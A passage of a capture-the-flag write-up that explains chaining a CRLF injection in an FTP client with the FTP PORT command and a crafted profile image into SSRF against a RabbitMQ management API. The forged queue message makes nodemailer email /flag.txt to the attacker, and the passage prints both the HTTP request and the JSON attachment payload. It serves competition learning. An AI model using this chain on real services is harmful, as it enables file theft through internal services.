Dz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a href="https://github.com/mscdex/node-ftp" target="_blank" rel="noopener">https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id="The-active-mode-of-FTP"><a href="#The-active-mode-of-FTP" class="headerlink" title="The active mode of FTP"></a>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don&#x2019;t inject code through CRLF, we can get the FTP traffic like this:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/2.png" alt></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&#x2019;t get the response on your server. It&#x2019;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id="The-mail-server"><a href="#The-mail-server" class="headerlink" title="The mail server"></a>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user&#x2019;s password.</p><p>services/api/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="hljs-string">&quot;/password-reset&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">let</span> { email } = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> email !== <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Bad body&quot;</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> newPassword = <span class="hljs-built_in">Array</span>.from(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">16</span>), <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">36</span>)]).join(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">let</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.hash(newPassword, <span class="hljs-number">14</span>);</span><br><span class="line">  <span class="hljs-keyword">await</span> withClient(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> client.query(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">UPDATE user_auth</span></span><br><span class="line"><span class="hljs-string">SET password = $2</span></span><br><span class="line"><span class="hljs-string">WHERE email = $1</span></span><br><span class="line"><span class="hljs-string">`</span>, [email, hashedPassword]));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">  channel.sendToQueue(<span class="hljs-string">&quot;email&quot;</span>, Buffer.from(<span class="hljs-built_in">JSON</span>.stringify({</span><br><span class="line">    to: email,</span><br><span class="line">    subject: <span class="hljs-string">&quot;Password Reset&quot;</span>,</span><br><span class="line">    text: <span class="hljs-string">`Hello there, your new password is <span class="hljs-subst">${newPassword}</span>`</span>,</span><br><span class="line">  })));</span><br><span class="line"></span><br><span class="line">  res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Password reset&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>It seems we can&#x2019;t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer&#x2019;s documentation.</p><p><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="noopener">https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;to&quot;</span>:<span class="hljs-string">&quot;your@gmail.com&quot;</span>,<span class="hljs-attr">&quot;subject&quot;</span>:<span class="hljs-string">&quot;Password Reset&quot;</span>,<span class="hljs-attr">&quot;text&quot;</span>:<span class="hljs-string">&quot;Hello there, your new password is newpass&quot;</span>,<span class="hljs-attr">&quot;attachments&quot;</span>:[{<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/flag.txt&quot;</span>}]}</span><br></pre></td></tr></tbody></table></figure><p></p><p>So what we need to do is to control nodemailer to send our message.</p><h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq"></a>rabbitmq</h2><p>services/email/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">channel.consume(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  channel.ack(msg);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());</span><br><span class="line">    <span class="hljs-keyword">await</span> transport.sendMail({</span><br><span class="line">      <span class="hljs-keyword">from</span>: <span class="hljs-string">&quot;plaid2020problem@gmail.com&quot;</span>,</span><br><span class="line">      subject: <span class="hljs-string">&quot;Your Account&quot;</span>,</span><br><span class="line">      ...data,</span><br><span class="line">    });</span><br><span class="line">  } <span class="hljs-keyword">catch</span> (e) {</span><br><span class="line">    <span class="hljs-built_in">console</span>.error(e);</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. </p><p>So it seems we can control what nodemailer send through rabbitmq&#x2019;s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF!"></a>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/exchanges/%2f/amq%2edefault/publish</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: 172.32.56.72:15672</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">authorization</span>: Basic dGVzdDp0ZXN0</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 300</span><br><span class="line"></span><br><span class="line">{&quot;properties&quot;:{},&quot;routing_key&quot;:&quot;email&quot;,&quot;payload&quot;:&quot;your_payload&quot;,&quot;payload_encoding&quot;:&quot;base64&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the TCP connection is not persisted, we can&#x2019;t get the response of rabbitmq server and most importantly we can&#x2019;t add a new message in rabbitmq queue. </p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0